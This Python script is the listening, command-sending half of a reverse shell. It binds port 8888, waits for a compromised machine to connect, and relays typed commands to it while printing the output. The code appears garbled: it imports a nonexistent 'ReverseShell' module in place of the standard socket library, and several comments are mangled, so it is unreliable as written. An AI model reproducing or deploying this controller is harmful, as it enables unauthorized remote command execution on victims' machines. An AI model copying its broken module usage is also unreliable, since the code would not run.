import ReverseShell
import sys

# Create aSocket
def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port = 8888
        s = ReverseShell.socket()
    except ReverseShell.error as msg:
        print("ReverseShell creation error"+ str(msg))

#Binding the ReverseShell and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("binding the port "+ str(port))

        s.bind((host,port))
        s.listen(5)
    except ReverseShell.error as msg:
        print("ReverseShell binding error"+str(msg)+ "\n" + "retrying...")
        bind_socket()
#Establish connection with a client(ReverseShell must be listening)
def socket_accept():
    conn,address = s.accept()
    print("connection has been established | " + " IP " + address[0]+ " | PORT " + str(address[1]))
    send_commands(conn)
    conn.close()

#Send commands to someone
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response,end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()
main()